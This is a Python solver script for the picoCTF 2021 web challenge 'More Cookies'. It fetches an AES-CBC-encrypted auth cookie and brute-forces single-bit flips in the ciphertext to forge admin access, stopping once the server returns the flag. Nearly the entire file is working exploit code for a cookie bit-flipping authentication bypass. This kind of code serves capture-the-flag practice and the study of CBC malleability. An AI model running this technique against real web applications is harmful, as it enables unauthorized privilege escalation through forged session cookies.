"""Solver for challenge 124 More Cookies (picoCTF 2021, Web).

The auth_name cookie is base64(base64(96-byte AES-CBC ciphertext)). AES-CBC is
malleable: flipping bit i of ciphertext block N flips bit i of plaintext
block N+1. Brute-force all 768 single-bit flips until the server renders the
flag instead of redirecting (plaintext contains is_admin=0 -> 1).

Usage: solve_124_more_cookies.py <base_url>
"""
import base64
import re
import sys
import urllib.request


def get_cookie(base: str) -> str:
    req = urllib.request.Request(base + '/')
    with urllib.request.urlopen(req, timeout=20) as resp:
        for h, v in resp.getheaders():
            if h.lower() == 'set-cookie' and 'auth_name=' in v:
                return v.split('auth_name=')[1].split(';')[0].strip()
    raise ValueError('auth_name cookie not found')


def check(base: str, outer: str) -> str:
    req = urllib.request.Request(base + '/', headers={'Cookie': f'auth_name={outer}'})
    with urllib.request.urlopen(req, timeout=20) as resp:
        return resp.read().decode(errors='replace')


def solve(base: str) -> str:
    base = base.rstrip('/')
    ct = bytearray(base64.b64decode(base64.b64decode(get_cookie(base))))
    assert len(ct) == 96, len(ct)
    for bpos in range(len(ct)):
        for bit in range(8):
            m = bytearray(ct)
            m[bpos] ^= (1 << bit)
            outer = base64.b64encode(base64.b64encode(bytes(m))).decode()
            body = check(base, outer)
            mflag = re.search(r'academy\{[^}]+\}', body)
            if mflag:
                return mflag.group(0)
    raise ValueError('flag not found after 768 flips')


if __name__ == '__main__':
    print(solve(sys.argv[1] if len(sys.argv) > 1 else 'http://xebec.cylabacademy.net:46272'))
